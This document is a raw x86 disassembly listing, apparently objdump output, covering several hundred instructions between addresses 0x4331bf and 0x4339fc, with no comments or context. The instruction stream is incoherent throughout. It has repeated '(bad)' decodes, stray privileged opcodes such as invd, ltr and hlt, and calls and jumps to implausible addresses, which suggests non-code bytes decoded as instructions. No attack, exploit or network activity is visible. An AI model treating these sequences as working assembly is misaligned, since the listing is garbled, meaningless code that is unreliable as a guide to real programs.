  4331bf:	sbb    al,0x33
  4331c1:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  4331c8:	add    BYTE PTR [ebp+0x44],0x8b
  4331cc:	jmp    0xf98b:0x100041c8
  4331d3:	xor    esi,DWORD PTR [edx+0x3]
  4331d6:	mov    ecx,DWORD PTR [edi]
  4331d8:	fmul   DWORD PTR [edx]
  4331da:	add    BYTE PTR [eax],al
  4331dc:	lea    eax,[ebx-0x4700273c]
  4331e2:	add    al,0x4f
  4331e4:	pop    DWORD PTR [eax]
  4331e6:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  4331ec:	push   edx
  4331ed:	inc    WORD PTR [ebp+0x8]
  4331f1:	mov    eax,0x514f4d
  4331f6:	(bad)
  4331fa:	add    al,al
  4331fc:	xor    DWORD PTR [ebx-0x74baf730],eax
  433202:	test   DWORD PTR [esi+0x74],esp
  433205:	inc    ebp
  433206:	mov    DWORD PTR [eax+0xa4f08],edi
  43320c:	add    BYTE PTR [ecx-0x76c435bb],cl
  433212:	or     dh,cl
  433214:	or     eax,0x8b8d5045
  433219:	inc    ebp
  43321a:	mov    WORD PTR [ecx+0x3b8a00],?
  433220:	jne    0x433255
  433222:	mov    edi,DWORD PTR [edx+0x8f3a18]
  433228:	add    DWORD PTR [ebx],eax
  43322a:	add    bh,bh
  43322c:	adc    DWORD PTR [eax],ecx
  43322e:	adc    DWORD PTR [ebp+0x55],edi
  433231:	push   es
  433232:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  433238:	mov    ebp,DWORD PTR [eax+ebp*1+0x50c411da]
  43323f:	inc    ebp
  433240:	mov    esp,edi
  433242:	or     al,0xda
  433244:	push   eax
  433245:	(bad)  
  433246:	jne    0x4331fc
  433248:	call   0x3b2b37
  43324d:	inc    ebp
  43324e:	rol    ah,0x84
  433251:	call   0xbc43f956
  433256:	jne    0x433232
  433258:	mov    ebx,ebx
  43325a:	inc    edi
  43325c:	and    al,al
  43325e:	fs jmp 0x7ec87863
  433264:	bswap  ecx
  433266:	scas   al,BYTE PTR es:[edi]
  433267:	inc    esp
  433268:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  43326f:	or     BYTE PTR [ebx-0x97717c6],0x83
  433276:	call   DWORD PTR [edi]
  433278:	shr    ah,0x84
  43327b:	xchg   DWORD PTR [eax],eax
  43327d:	add    DWORD PTR [eax],eax
  43327f:	add    bh,bh
  433281:	dec    ebp
  433282:	and    BYTE PTR [ecx-0x38],dl
  433285:	push   eax
  433286:	dec    DWORD PTR [ebx+0xfd885]
  43328c:	mov    BYTE PTR [ebp+0x508bac00],cl
  433292:	mov    WORD PTR [ecx+0x0],ss
  433295:	lea    ecx,[ebx+0x108b20d8]
  43329b:	mov    WORD PTR [edx],ds
  43329d:	add    BYTE PTR [edi+0xff01ff],al
  4332a3:	mov    ecx,DWORD PTR [ebp-0x28]
  4332a6:	push   ecx
  4332a7:	shl    BYTE PTR [ebp+0x3a],0x8b
  4332ab:	inc    ebp
  4332ac:	in     al,0xeb
  4332ae:	jno    0x43323b
  4332b0:	push   edx
  4332b1:	mov    DWORD PTR [eax-0x28],edx
  4332b4:	mov    eax,DWORD PTR [ebp+0x20]
  4332b7:	je     0x433240
  4332b9:	mov    eax,DWORD PTR [ecx]
  4332bb:	sbb    BYTE PTR [eax],al
  4332bd:	pop    DWORD PTR [eax]
  4332bf:	add    esi,eax
  4332c1:	add    bl,al
  4332c3:	adc    DWORD PTR [edi],esi
  4332c5:	jmp    0x8bce8317
  4332ca:	sub    BYTE PTR [ebp+eax*2-0x63c4ca00],cl
  4332d1:	jne    0x43325e
  4332d3:	mov    ecx,DWORD PTR [eax]
  4332d5:	in     al,0x75
  4332d7:	pop    DWORD PTR [ecx+0x5101]
  4332dd:	push   edx
  4332de:	inc    DWORD PTR [ebx]
  4332e0:	adc    BYTE PTR [ecx+0x45721cc6],cl
  4332e6:	add    BYTE PTR [edi+0x9],dl
  4332e9:	call   DWORD PTR [esi]
  4332eb:	and    dl,al
  4332ed:	and    bh,bh
  4332ef:	inc    edi
  4332f1:	test   eax,edx
  4332f3:	sldt   ebx
  4332f6:	cmp    DWORD PTR [eax],eax
  4332f8:	pushf  
  4332f9:	(bad)  
  4332fa:	jmp    0x433308
  4332fc:	mov    eax,edi
  4332fe:	or     al,0x75
  433300:	inc    eax
  433301:	call   0x432a09
  433306:	mov    eax,eax
  433308:	loopne 0x43328e
  43330a:	inc    ebp
  43330b:	add    BYTE PTR [ebx+0x1451c00],cl
  433311:	mov    eax,DWORD PTR [ebp+0x20]
  433314:	add    edi,ecx
  433316:	add    BYTE PTR [eax],ch
  433318:	cmp    edi,0x18
  43331b:	test   DWORD PTR [ebp+0xf],esi
  43331e:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  433325:	jne    0x433329
  433327:	call   0xffa22dec
  43332c:	leave  
  43332d:	rcr    BYTE PTR [esp+eax*4],0x55
  433331:	add    ah,ch
  433333:	add    BYTE PTR [edi-0x48fef979],dh
  433339:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  433340:	inc    esp
  433341:	mov    ebx,DWORD PTR [eax]
  433343:	fcom   st(2)
  433345:	add    BYTE PTR [edi],bl
  433347:	lea    ecx,[eax-0x18]
  43334a:	(bad)  
  43334b:	push   DWORD PTR [ecx]
  43334d:	call   0xffb580af
  433352:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  433356:	fstp   DWORD PTR [esi+ebx*8]
  433359:	push   ebp
  43335a:	pop    ebp
  43335b:	mov    esi,DWORD PTR [edx-0x38]
  43335e:	add    DWORD PTR [eax],0x28
  433361:	mov    edi,DWORD PTR [ebx]
  433363:	xor    esi,DWORD PTR [edx+0x3]
  433366:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  43336a:	pop    ebp
  43336b:	or     al,0x4
  43336d:	inc    ecx
  43336e:	push   ebp
  43336f:	(bad)  
  433370:	in     al,dx
  433371:	or     ah,ch
  433373:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  433374:	xbegin 0xffc8a96a
  43337a:	clc    
  43337b:	adc    al,0x45
  43337d:	idiv   BYTE PTR [ecx]
  43337f:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  433386:	test   DWORD PTR [ecx+0x665b00f8],ebx
  43338c:	add    BYTE PTR [ecx+0x66],dh
  43338f:	add    eax,DWORD PTR [ebp+0x52]
  433392:	adc    eax,0x20
  433395:	xchg   DWORD PTR [ecx+0x4400fc01],ecx
  43339b:	test   DWORD PTR [eax],eax
  43339d:	clc    
  43339e:	data16 or al,BYTE PTR [ebp+0x45]
  4333a2:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  4333a9:	rol    BYTE PTR [ebp+0x45],1
  4333ac:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  4333b2:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  4333b8:	push   ebx
  4333b9:	add    BYTE PTR [ecx+0x0],dl
  4333bc:	push   ecx
  4333bd:	jge    0x4333f2
  4333bf:	add    BYTE PTR [esi+0x4],dl
  4333c2:	jne    0x433429
  4333c4:	mov    edx,0x457200
  4333c9:	jmp    0x43338d
  4333cb:	xor    edi,DWORD PTR [ebx]
  4333cd:	pop    edi
  4333ce:	cvtdq2ps xmm7,xmm0
  4333d1:	ret    0x0
  4333d4:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  4333da:	xor    ecx,DWORD PTR [edi]
  4333dc:	add    eax,DWORD PTR [ecx+0x3b]
  4333df:	push   ebx
  4333e0:	rdpmc  
  4333e2:	out    0x8d,al
  4333e4:	add    BYTE PTR [eax],cl
  4333e6:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  4333ec:	ret    0x450c
  4333ef:	sbb    al,0x8b
  4333f1:	cmp    eax,esi
  4333f3:	or     cl,al
  4333f5:	or     al,0xc2
  4333f7:	pop    eax
  4333f8:	inc    ebp
  4333f9:	add    ecx,DWORD PTR [edi]
  4333fb:	add    esi,DWORD PTR [ebp+0x39]
  4333fe:	invd   
  433400:	jge    0x43340c
  433402:	mov    eax,0x478ac0
  433407:	cli    
  433408:	xor    esp,ecx
  43340a:	mov    ebx,0x5b8ac0
  43340f:	ret    0x33
  433412:	mov    eax,0x833a8b
  433417:	sub    BYTE PTR [ebx],al
  433419:	inc    ebp
  43341a:	data16 ss clc 
  43341d:	pushf  
  43341e:	inc    bh
  433420:	mov    esp,esp
  433422:	hlt    
  433423:	test   DWORD PTR [ebp-0x8],esi
  433426:	mov    eax,DWORD PTR [ebp-0x14]
  433429:	cmp    BYTE PTR [ebx-0x76478864],cl
  43342f:	dec    edi
  433430:	or     BYTE PTR [eax],al
  433432:	jne    0x4333bd
  433434:	mov    esi,esp
  433436:	call   0x77a9bffb
  43343b:	inc    ebp
  43343c:	mov    DWORD PTR [eax+0x994f0c],edi
  433442:	add    BYTE PTR [ecx-0x3ffe0717],cl
  433448:	add    BYTE PTR [esi+0x7d],ah
  43344b:	inc    ebp
  43344c:	mov    bx,WORD PTR [ebp+0x8]
  433450:	add    DWORD PTR [ebp+0x51],0x30c008b
  433457:	inc    ebp
  433458:	mov    bx,di
  43345b:	lock test BYTE PTR [ecx+0x7000801],bh
  433462:	jge    0x433425
  433464:	mov    ecx,DWORD PTR [ebx-0x660613f0]
  43346a:	cli    
  43346b:	xor    bl,bh
  43346d:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  433473:	test   BYTE PTR [eax],cl
  433475:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  43347c:	cmp    ebp,eax
  43347e:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  433485:	test   BYTE PTR [ebp+0x1],bh
  433488:	mov    ebx,0x458a00
  43348d:	xor    esi,DWORD PTR [ebx]
  43348f:	add    esp,DWORD PTR [esi-0x77]
  433492:	pop    ebp
  433493:	loopne 0x4334fb
  433495:	inc    ebp
  433496:	clc    
  433497:	xor    edi,DWORD PTR [ebx]
  433499:	add    esi,DWORD PTR [edx-0x77]
  43349c:	data16 fdivr QWORD PTR [ebp-0x49]
  4334a0:	mov    ebx,0xb78afc
  4334a5:	hlt    
  4334a6:	xor    edi,DWORD PTR [eax]
  4334a8:	data16 add BYTE PTR [ebp+0x66],bl
  4334ac:	data16 lock clc 
  4334af:	cmp    BYTE PTR [ebx],bh
  4334b1:	add    BYTE PTR [edi+0x66],dh
  4334b4:	psubq  mm7,QWORD PTR [ebp-0x2]
  4334b8:	ltr    WORD PTR [ebp+0x66]
  4334bc:	add    esi,eax
  4334be:	add    di,WORD PTR [ebp+0x2b]
  4334c2:	data16 data16 jge 0x433543
  4334c6:	mov    ebx,0xe08a8b
  4334cb:	jge    0x433500
  4334cd:	data16 data16 xor al,0x5d
  4334d1:	data16 data16 jne 0x4334cd
  4334d5:	mov    edi,DWORD PTR [ebx]
  4334d7:	fdiv   QWORD PTR [edx+0x7d]
  4334da:	data16 data16 jge 0x433512
  4334de:	mov    ebx,0x758a66
  4334e3:	mov    esi,0x667233
  4334e8:	pop    ebp
  4334e9:	or     BYTE PTR [esi+0x0],ah
  4334ec:	clc    
  4334ed:	mov    edi,DWORD PTR [ebx]
  4334ef:	lock ja 0x43347d
  4334f2:	(bad)  
  4334f4:	jge    0x4334ed
  4334f6:	invd   
  4334f8:	pop    ebp
  4334f9:	add    BYTE PTR [ebx],al
  4334fb:	(bad)  
  4334fc:	cmp    di,WORD PTR [ebp+0xf]
  433500:	data16 sbb bh,BYTE PTR [ebp+0x0]
  433504:	mov    bx,WORD PTR [ebp-0x10]
  433508:	pop    bp
  43350a:	fbstp  TBYTE PTR [ebx]
  43350c:	test   DWORD PTR [ebx],eax
  43350e:	add    BYTE PTR [ebx],bh
  433510:	add    BYTE PTR [esi+0x7d],ah
  433513:	jge    0x4334a0
  433515:	data16 in al,dx
  433517:	pop    ebp
  433518:	stc    
  433519:	bsf    ecx,DWORD PTR [ebp+0x66320099]
  433520:	mov    edi,ebx
  433522:	in     al,dx
  433523:	test   BYTE PTR [ebp+0x0],bh
  433526:	mov    eax,DWORD PTR [eax]
  433528:	call   0xbd402eb8
  43352d:	cmp    BYTE PTR [ecx-0x7699ce00],bl
  433533:	sti    
  433534:	call   0x8b4bb2c4
  433539:	add    ebp,esp
  43353b:	mov    bx,di
  43353e:	jnp    0x433566
  433540:	mov    DWORD PTR [ebx+0x387df808],ecx
  433546:	mov    eax,DWORD PTR [eax]
  433548:	call   0x7c3ec0b3
  43354d:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  433553:	data16 data16 fistp WORD PTR [ebp+0xe]
  433558:	xor    DWORD PTR [edi-0x48fff7af],0xfb66f403
  433562:	fisttp WORD PTR [ecx-0x7401f77b]
  433568:	(bad)  
  433569:	cld    
  43356a:	jne    0x4335a4
  43356c:	xor    eax,DWORD PTR [eax]
  43356e:	mov    esp,DWORD PTR [esi-0x10]
  433571:	sti    
  433572:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  433579:	data16 adc bl,bh
  43357c:	push   ebp
  43357d:	xor    ecx,DWORD PTR es:[ebx+0x38e4f88b]
  433584:	mov    WORD PTR [eax],es
  433586:	cdq    
  433587:	data16 xor bh,bl
  43358a:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  433590:	mov    esp,DWORD PTR [esi-0x14]
  433593:	fisttp WORD PTR [ebx-0x3748a9f2]
  433599:	or     al,0x2b
  43359b:	mov    bh,0xba
  43359d:	hlt    
  43359e:	mov    bh,bl
  4335a0:	add    BYTE PTR [ecx-0x7446f3cd],cl
  4335a6:	dec    edi
  4335a7:	or     al,0x0
  4335a9:	mov    edi,DWORD PTR [ebx]
  4335ab:	or     BYTE PTR [ebp+0x3b],dh
  4335ae:	mov    ecx,DWORD PTR [edi]
  4335b0:	fdivr  QWORD PTR [ebx-0x7499ff83]
  4335b6:	xor    al,0xd8
  4335b8:	pop    bp
  4335ba:	lock xor esi,DWORD PTR [ebx]
  4335bd:	lea    esp,[esi+0x1f]
  4335c0:	icebp  
  4335c1:	jb     0x4335c7
  4335c3:	add    al,al
  4335c5:	jge    0x4335d3
  4335c7:	mov    eax,eax
  4335c9:	fsubr  st,st(3)
  4335cb:	pop    ebp
  4335cc:	mov    esi,DWORD PTR [ebx]
  4335ce:	in     al,0x8d
  4335d0:	rcr    DWORD PTR [edi],0xc2
  4335d3:	jb     0x433633
  4335d5:	add    cl,cl
  4335d7:	jge    0x4335e5
  4335d9:	mov    edx,DWORD PTR [ebp-0x20]
  4335dc:	in     al,dx
  4335dd:	pop    ebp
  4335de:	data16 data16 or BYTE PTR [esi+edi*4],bh
  4335e3:	data16 cmp bh,BYTE PTR [ebp+0x0]
  4335e7:	mov    ebp,DWORD PTR [ebx]
  4335e9:	fdivr  QWORD PTR [esi+0x668a5d]
  4335ef:	cmp    al,0x33
  4335f1:	mov    si,0x4f7d
  4335f5:	mov    eax,DWORD PTR [eax]
  4335f7:	lock inc ebp
  4335f9:	mov    esi,DWORD PTR [edi]
  4335fb:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  433602:	clc    
  433603:	(bad)  
  433604:	cmp    edi,DWORD PTR [ebx]
  433606:	je     0x433617
  433608:	push   ebx
  433609:	loopne 0x43361a
  43360b:	dec    ecx
  43360d:	mov    esp,DWORD PTR [edi-0x1c]
  433610:	int    0xf1
  433612:	mov    esi,0x703084d
  433617:	pcmpgtd mm6,mm1
  43361a:	add    BYTE PTR [ebp+0x66],dh
  43361d:	jmp    0x4335ea
  43361f:	mov    eax,DWORD PTR [ebx]
  433621:	lock push ebp
  433623:	ror    DWORD PTR [ebp-0x2972feb3],1
  433629:	or     bh,dl
  43362b:	jb     0x43362b
  43362d:	add    BYTE PTR [ebx-0x1a7487b3],cl
  433633:	loopne 0x433635
  433635:	jne    0x433635
  433637:	data16 add BYTE PTR [esi+eiz*2],dh
  43363b:	mov    ecx,ebx
  43363d:	data16 cmp cl,dh
  433640:	add    BYTE PTR [eax],bh
  433642:	data16 add bl,cl
  433645:	data16 cmp dh,dl
  433648:	add    BYTE PTR [edx],bh
  43364a:	data16 add bl,cl
  43364d:	enterw 0x4df1,0x19
  433652:	pop    edi
  433653:	jne    0x4335d6
  433655:	mov    esi,DWORD PTR [edi]
  433657:	call   0x77b7c1f8
  43365c:	xor    ebp,DWORD PTR [ebx]
  43365e:	lea    esp,[esi+0x48]
  433661:	repnz in eax,0x3b
  433664:	add    BYTE PTR [ebp-0x37],dh
  433667:	xor    edx,DWORD PTR [ebp-0x15]
  43366a:	in     al,dx
  43366b:	xor    edx,DWORD PTR [esi+0x40]
  43366e:	mov    DWORD PTR [edi],0x338545fc
  433674:	clc    
  433675:	add    esi,DWORD PTR [esi]
  433677:	pop    edi
  433678:	pushf  
  433679:	pop    ebx
  43367a:	call   0xff443641
  43367f:	mov    edi,eax
  433681:	push   ecx
  433682:	pop    es
  433683:	mov    edi,DWORD PTR [edx]
  433685:	push   esi
  433686:	inc    esp
  433687:	(bad)  
  433688:	jle    0x43368a
  43368a:	popa   
  43368b:	data16 (bad) 
  43368d:	into   
  43368e:	addr16 cmp ch,cl
  433691:	add    BYTE PTR [ecx+0x7ce0866],bh
  433697:	cmp    ah,BYTE PTR [esi+0x0]
  43369a:	add    bh,al
  43369c:	(bad)  
  43369d:	cld    
  43369e:	add    BYTE PTR [ebp+0x36c3f866],al
  4336a4:	cmp    BYTE PTR [eax+eax*1-0x3c31999a],bl
  4336ab:	pop    ebp
  4336ac:	or     BYTE PTR [edi+0x0],dl
  4336af:	mov    bh,0x66
  4336b1:	mov    edi,0xff038dc3
  4336b6:	jne    0x433709
  4336b8:	lea    edx,[ecx+0x1]
  4336bb:	mov    ebx,0xd64ff1
  4336c0:	sar    DWORD PTR [ebx],1
  4336c2:	test   BYTE PTR [ebp+0x32],dh
  4336c5:	mov    DWORD PTR [esp+edi*8-0x76],esp
  4336c9:	push   edi
  4336ca:	xor    BYTE PTR [ebx],0x3a
  4336cd:	mov    esi,ebx
  4336cf:	xor    eax,DWORD PTR [eax-0x3c73819a]
  4336d5:	xor    al,BYTE PTR [ebp+0x64]
  4336d8:	pop    ebx
  4336d9:	mov    ebx,0x9c3a37
  4336de:	je     0x43370b
  4336e0:	xor    edi,DWORD PTR [ebx+0x668a33]
  4336e6:	mov    WORD PTR [ebx],?
  4336e8:	xor    bh,BYTE PTR [ebx+0x8b4f64]
  4336ee:	pop    edi
  4336ef:	cmp    ecx,ecx
  4336f1:	jne    0x433748
  4336f3:	mov    ebp,esp
  4336f5:	cld    
  4336f6:	push   esi
  4336f7:	pop    ebx
  4336f8:	inc    ebp
  4336f9:	stc    
  4336fa:	aaa    
  4336fb:	test   DWORD PTR [eax+edi*8-0x317af642],ebx
  433702:	clc    
  433703:	test   dl,dl
  433705:	xor    al,0xff
  433707:	fs pop si
  43370a:	or     bl,al
  43370c:	dec    BYTE PTR [ebx+0x57665100]
  433712:	retf   0x3845
  433715:	aaa    
  433716:	add    BYTE PTR [esi+eiz*2+0x3a85cabe],bl
  43371d:	clc    
  43371e:	add    BYTE PTR [ebx+0x66],bl
  433721:	dec    edx
  433723:	mov    edx,DWORD PTR [edi-0x76]
  433726:	push   edi
  433727:	add    al,0xb7
  433729:	xor    al,0xba
  43372b:	cmp    al,0x8d
  43372d:	je     0x43372e
  43372f:	mov    edx,DWORD PTR [ecx-0x46]
  433732:	push   ecx
  433733:	lea    edi,[ebx+0x514fff]
  433739:	push   ecx
  43373a:	cmp    edx,DWORD PTR [ebx+0x75]
  43373d:	mov    ecx,DWORD PTR [ecx+0x723afcbb]
  433743:	add    BYTE PTR [ebx],dh
  433745:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  43374b:	add    BYTE PTR [ebx+esi*1+0x4f64bb32],cl
  433752:	mov    ebx,0x3b3a00
  433757:	jne    0x433784
  433759:	mov    DWORD PTR [ebx+0x728afc],edi
  43375f:	xor    esi,DWORD PTR [ebx]
  433761:	mov    edi,DWORD PTR [ebx+0x8d4f33]
  433767:	push   edi
  433768:	cmp    esp,ebp
  43376a:	jne    0x43376c
  43376c:	sbb    DWORD PTR [eax],0x8085c3fc
  433772:	clc    
  433773:	inc    esp
  433774:	pop    ebx
  433775:	sti    
  433776:	add    eax,0xeb8bc075
  43377b:	cld    
  43377c:	xor    edi,DWORD PTR ds:0xf8c3855e
  433782:	mov    ecx,DWORD PTR [ecx+edx*2]
  433785:	rol    DWORD PTR [ebp-0x37],0xf
  433789:	mov    DWORD PTR [eax],ecx
  43378b:	inc    edi
  43378c:	(bad)  
  43378d:	in     eax,0x2
  43378f:	add    bh,bh
  433791:	(bad)  
  433792:	mov    esi,0xc38a5e
  433797:	mov    esi,DWORD PTR [ebx]
  433799:	push   ecx
  43379a:	mov    edi,0xfc4fc7
  43379f:	test   DWORD PTR [ebp-0x8],edx
  4337a2:	data16 ss (bad) 
  4337a5:	pushf  
  4337a6:	sub    ebp,eax
  4337a8:	inc    ebp
  4337a9:	(bad)  
  4337aa:	sub    edi,edi
  4337ac:	mov    DWORD PTR [ebx+0x3a03ba08],ecx
  4337b2:	inc    ebp
  4337b3:	add    BYTE PTR [esi+0x2b],ah
  4337b6:	or     bh,BYTE PTR [edx+0xf8ac2]
  4337bc:	cmp    al,0x33
  4337be:	mov    edi,DWORD PTR [edx+0x24f81]
  4337c4:	(bad)  
  4337c5:	cmp    esi,DWORD PTR [ebx]
  4337c7:	je     0x433781
  4337c9:	push   ebx
  4337ca:	dec    edi
  4337cb:	str    ecx
  4337ce:	cmp    esp,DWORD PTR [edi+0x75]
  4337d1:	int    0x33
  4337d3:	mov    edi,0x789085f
  4337d8:	mov    ecx,DWORD PTR [eax]
  4337da:	cld    
  4337db:	add    cl,cl
  4337dd:	data16 add al,0xcb
  4337e0:	push   ebp
  4337e1:	add    ebp,esp
  4337e3:	jne    0x4337d1
  4337e5:	(bad)  
  4337e6:	mov    DWORD PTR [ecx],0xd685f7ec
  4337ec:	clc    
  4337ed:	xlat   BYTE PTR ds:[ebx]
  4337ee:	inc    ebp
  4337ef:	mov    edi,DWORD PTR [ecx]
  4337f1:	push   eax
  4337f2:	pushf  
  4337f3:	in     eax,0x8b
  4337f5:	add    ah,ch
  4337f7:	(bad)  
  4337f8:	push   ecx
  4337f9:	add    BYTE PTR [ecx+0x66],dl
  4337fc:	add    eax,0x3872cb
  433801:	add    BYTE PTR [ebp+0x66],al
  433804:	(bad)  
  433805:	retf   
  433806:	lock cmp al,BYTE PTR [ebp+0x4566f800]
  43380d:	retf   
  43380e:	cmp    cl,al
  433810:	pushf  
  433811:	jge    0x4337da
  433813:	aaa    
  433814:	cld    
  433815:	pushf  
  433816:	test   DWORD PTR [edi-0x8],ebx
  433819:	je     0x433860
  43381b:	xor    esi,DWORD PTR ds:0x7020840
  433821:	ror    BYTE PTR [ebp-0x37],0x8d
  433825:	push   ebp
  433826:	add    esp,ebp
  433828:	jb     0x4337b5
  43382a:	add    BYTE PTR [eax],cl
  43382c:	dec    ebp
  43382d:	mov    bh,0x81
  43382f:	push   esi
  433830:	push   ecx
  433831:	adc    DWORD PTR [ecx-0x3b],0x3899ff81
  433838:	xor    al,BYTE PTR [eax]
  43383a:	mov    edx,DWORD PTR [edi+0x10]
  43383d:	(bad)  
  43383e:	scas   eax,DWORD PTR es:[edi]
  43383f:	cmp    bh,BYTE PTR [ebx]
  433841:	add    BYTE PTR [edi],cl
  433843:	mov    ebp,ebp
  433845:	cld    
  433846:	add    BYTE PTR [ebx],bh
  433848:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  43384c:	dec    ebp
  43384d:	or     BYTE PTR [ebx],ch
  43384f:	ret    0x458b
  433852:	lock jmp 0x433846
  433855:	mov    ecx,DWORD PTR [eax]
  433857:	or     BYTE PTR [edi],al
  433859:	mov    ecx,eax
  43385b:	xor    DWORD PTR [edx+0x2],0x0
  43385f:	mov    bh,0xc1
  433861:	adc    BYTE PTR [eax],dh
  433863:	iret   
  433864:	inc    ebp
  433865:	mov    DWORD PTR [ebx],0x4dfff8c5
  43386b:	inc    BYTE PTR [ebx]
  43386d:	cmp    bh,al
  43386f:	add    BYTE PTR [ecx],dl
  433871:	data16 adc al,bh
  433874:	dec    ecx
  433875:	fisttp WORD PTR [ecx+0x456604c0]
  43387b:	add    dh,BYTE PTR ds:0x75e0845
  433881:	ret    0x4d
  433884:	lea    ecx,[ebx+0x18728301]
  43388a:	add    BYTE PTR [ebp+0x45],al
  43388d:	ss jmp 0x10a392f
  433893:	call   0xf8cebddd
  433898:	clc    
  433899:	inc    ebp
  43389a:	shl    DWORD PTR ds:0x781084d,0x51
  4338a1:	cdq    
  4338a2:	push   ecx
  4338a3:	xor    al,BYTE PTR [ecx+0x32f89989]
  4338a9:	inc    ebp
  4338aa:	cmp    edi,DWORD PTR [esi]
  4338ac:	jbe    0x43384a
  4338ae:	mov    eax,edi
  4338b0:	or     ah,dh
  4338b2:	inc    ebp
  4338b3:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  4338b9:	cmp    BYTE PTR [ebx-0x74747664],cl
  4338bf:	in     al,dx
  4338c0:	hlt    
  4338c1:	push   ecx
  4338c2:	push   ecx
  4338c3:	push   ecx
  4338c4:	push   ecx
  4338c5:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  4338cb:	cdq    
  4338cc:	cdq    
  4338cd:	xor    dh,BYTE PTR [edx]
  4338cf:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  4338d5:	or     BYTE PTR [ebp+0x7],al
  4338d8:	mov    eax,ecx
  4338da:	clc    
  4338db:	jb     0x43389e
  4338dd:	add    BYTE PTR [ebp+0x55],cl
  4338e0:	or     DWORD PTR [edi],0xc251d151
  4338e6:	add    DWORD PTR [ebx+0x320099],0x8b76453b
  4338f0:	mov    edi,eax
  4338f2:	or     cl,al
  4338f4:	inc    ebp
  4338f5:	dec    ebp
  4338f6:	mov    eax,DWORD PTR [ecx+0x514d510c]
  4338fc:	or     WORD PTR [ecx],0x8999
  433901:	xor    cl,BYTE PTR [ebx+0x5176fc3b]
  433907:	mov    edx,DWORD PTR [ecx+0x8]
  43390a:	mov    eax,DWORD PTR [ebp-0x8]
  43390d:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb267]
  433914:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  43391a:	inc    ebp
  43391b:	dec    eax
  43391c:	add    ecx,DWORD PTR [ebx+0x514df0f8]
  433922:	add    edx,DWORD PTR [ecx-0x8]
  433925:	mov    ecx,DWORD PTR [ecx]
  433927:	clc    
  433928:	or     BYTE PTR [ebp+eax*2+0x45324099],al
  43392f:	mov    ecx,ebp
  433931:	clc    
  433932:	(bad)  
  433933:	popf   
  433934:	inc    DWORD PTR [eax]
  433936:	ret    0x8b
  433939:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  43393f:	mov    edi,esp
  433941:	hlt    
  433942:	test   ecx,esi
  433944:	clc    
  433945:	or     BYTE PTR [ebp+0x7],al
  433948:	cmp    ecx,eax
  43394a:	pushf  
  43394b:	jb     0x433980
  43394d:	add    BYTE PTR [eax-0x3f],al
  433950:	inc    eax
  433951:	daa    
  433952:	inc    ebp
  433953:	inc    ebp
  433954:	xor    eax,0x7f80803
  433959:	dec    ebp
  43395a:	cdq    
  43395b:	add    esi,DWORD PTR [edx]
  43395d:	clc    
  43395e:	cmp    DWORD PTR [ecx],ecx
  433960:	or     al,0x8
  433962:	add    al,BYTE PTR [ebp+0x2c]
  433965:	xor    eax,0x7350845
  43396a:	or     BYTE PTR [ebp+0x7],cl
  43396d:	lea    ebx,[ecx-0x748dcdff]
  433973:	add    BYTE PTR [eax*2-0x74b21438],cl
  43397a:	mov    edx,DWORD PTR [eax]
  43397c:	cld    
  43397d:	dec    ebp
  43397e:	push   ecx
  43397f:	sub    edx,DWORD PTR [ecx-0x75]
  433982:	add    eax,0xf172fc
  433987:	or     BYTE PTR [ebp+0x7],cl
  43398a:	add    eax,ecx
  43398c:	or     al,0x72
  43398e:	add    DWORD PTR [eax],eax
  433990:	mov    ebx,0x29c2c1
  433995:	inc    ebp
  433996:	mov    eax,DWORD PTR [ebx]
  433998:	cmp    eax,0x3004d1c
  43399e:	xbegin 0x66c8c598
  4339a4:	clc    
  4339a5:	or     BYTE PTR [ebp+0x45],al
  4339a8:	cmp    DWORD PTR ds:0x78b089c,esi
  4339ae:	adc    BYTE PTR [ebp+0x45],cl
  4339b1:	lea    eax,[ebp+0x33727501]
  4339b7:	add    cl,ch
  4339b9:	inc    ebp
  4339ba:	add    bl,ch
  4339bc:	add    BYTE PTR [ebx+0x45850845],cl
  4339c2:	je     0x43394f
  4339c4:	push   ebx
  4339c5:	or     al,0x85
  4339c7:	dec    ebp
  4339c8:	std    
  4339c9:	mov    bh,bh
  4339cb:	mov    BYTE PTR [ebp-0x75],al
  4339ce:	mov    edi,eax
  4339d0:	or     al,0x89
  4339d2:	inc    ebp
  4339d3:	clc    
  4339d4:	mov    esp,esp
  4339d6:	hlt    
  4339d7:	call   DWORD PTR [edi-0x37]
  4339da:	push   ecx
  4339db:	or     al,0x51
  4339dd:	push   ebp
  4339de:	xor    ebp,esp
  4339e0:	mov    esi,0x457251
  4339e5:	ss (bad) 
  4339e7:	pushf  
  4339e8:	inc    ebp
  4339e9:	(bad)  
  4339ea:	mov    edi,eax
  4339ec:	or     al,0x85
  4339ee:	add    al,bh
  4339f0:	inc    eax
  4339f2:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  4339f6:	or     ah,bh
  4339f8:	inc    eax
  4339f9:	push   ecx
  4339fa:	jmp    0x433a4d
  4339fc:	mov    eax,DWORD PTR ds:0xe8720c
